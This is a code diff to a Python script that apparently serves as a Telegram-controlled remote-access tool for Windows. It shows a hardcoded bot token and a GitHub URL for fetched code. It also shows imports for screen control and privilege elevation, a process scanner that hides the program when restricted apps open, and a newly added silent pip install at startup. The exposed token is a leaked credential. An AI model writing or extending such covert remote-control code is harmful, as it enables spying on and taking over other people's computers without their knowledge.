@@ -1,3 +1,38 @@
+
+
+import subprocess
+import pkg_resources
+import sys
+
+
+
+
+
+
+
+
+
+
+required={"python-telegram-bot","psutil","datetime","messages","urllib3","regex","psutil","datetime","pyautogui","elevate"}
+installed={pkg.key for pkg in pkg_resources.working_set}
+missing=required-installed
+if missing:
+    subprocess.check_call([sys.executable,"-m","pip","install",*missing])
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 import urllib3 
 import regex
 import subprocess
@@ -19,8 +54,8 @@ from win32com.shell import shell
 import multiprocessing
 from multiprocessing import Process
 import time
-
-
+from os.path import expanduser
+import os.path
 
 file=sys.argv[0] 
 #Token for the telegram bot.
@@ -29,6 +64,8 @@ token="6199318379:AAGmrDxxhYeYWabD8MqyrMMwKvVztDkPhGE"
 url="https://raw.githubusercontent.com/Mainakdey1/PythonStuff/main/development_file.py"
 #delay value(int) for process scanner
 delay=0.1
+dir_pathV= expanduser("~")+"\\"
+
 
 
 
@@ -75,34 +112,37 @@ class process_scanner:
 class logger:
 
 
-    def __init__(self,_log_file,_global_severity=0 ,_logobj= str):
+    def __init__(self,_log_file,_global_severity=0 ,_dir_path=str,_logobj= str):
         self._logobj=_logobj
         self._global_severity=_global_severity
         self._log_file=_log_file
+        self._dir_path=_dir_path
+        
     
 
     def info(self,_function_name,_message):
 
-        log_file=open(self._log_file,"a+")
+    
+        log_file=open(self._dir_path+self._log_file,"a+")
         log_file.write("\n"+time.ctime()+" at "+str(time.perf_counter_ns())+"    "+_function_name+"   called (local_severity=INFO)with message:  "+_message)
         log_file.close()
 
 
     def warning(self,_function_name,_message):
 
-        log_file=open(self._log_file,"a+")
+        log_file=open(self._dir_path+self._log_file,"a+")
         log_file.write("\n"+time.ctime()+" at "+str(time.perf_counter_ns())+"    "+_function_name+"   called (local_severity=WARNING)with message:  "+_message)
         log_file.close()
 
     def critical(self,_function_name,_message):
 
-        log_file=open(self._log_file,"a+")
+        log_file=open(self._dir_path+self._log_file,"a+")
         log_file.write("\n"+time.ctime()+" at "+str(time.perf_counter_ns())+"    "+_function_name+"   called (local_severity=CRITICAL)with message:  "+_message)
         log_file.close()
  
 #call this method to produce the log file
     def producelog(self):
-        log_file=open(self._log_file,"r")
+        log_file=open(self._dir_path+self._log_file,"r")
         msg=log_file.readlines()
         log_file.close()
         return msg
@@ -126,7 +166,7 @@ class logger:
 
 
 
-logins=logger("logfile.txt",0,"globallogger")
+logins=logger("logfile.txt",0,dir_pathV,"globallogger")
 
 
 #installs crucial modules by calling pip. Note: programmatic use of pip is strictly not allowed.
@@ -453,36 +493,7 @@ else:
 
     if __name__ == "__main__":
         try:
-            queue=multiprocessing.Queue()
-            queue.put(ret)
-            #Scanner thread created here
-            p=Process(target=start_subprocess,args=(queue,))
-            #Note: Thread creation causes execution of top level scope again.
-            #Please be aware of this when defining functions at the top level scope
-            #as otherwise they will be called more than once depending on how many threads you create.
-
-            try:
-
-                p.start()
-                logins.info("PROCESS SCANNER","THREAD CREATED")
-            except:
-                logins.critical("PROCESS SCANNER","THREAD CREATION FAILED")
-            try:
-                #main function thread created here.
-                pmain=Process(target=main)
-                pmain.start()
-                logins.info("MAIN","THREAD CREATED")
-
-            except:
-                logins.critical("MAIN","THREAD CREATION FAILED")
-
-
-            #scanner must wait untill either it is terminated by the program itself, or a restricted app is called by the host system.
-            p.join()
-
-            #if global hide value becomes true, end all process threads immediately.
-            if queue.get()['main_hidev']==True:
-                end_main_process()
+            main()
         
         except:
             logins.critical("MAIN","ERROR OCCURED WHILE INITIATING MAIN")
